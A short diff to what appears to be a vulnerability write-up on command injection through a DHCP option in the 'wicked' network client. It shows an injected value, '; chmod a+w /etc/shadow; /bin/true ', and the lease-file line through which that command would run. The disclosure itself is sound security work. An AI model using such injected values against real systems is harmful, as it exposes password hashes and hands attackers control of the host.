@@ -510,7 +510,7 @@ dhcp-option=100,'; chmod a+w /etc/shadow; /bin/true '
 results in the following line in the leaseinfo file:
 
 ```
-POSIXTZSTRING='Hello_World'; chmod a+w /etc/shadow; /bin/true ''
+POSIXTZSTRING=''; chmod a+w /etc/shadow; /bin/true ''
 ```
 
 The interesting part about this issue is *who* actually executes this. `wicked`
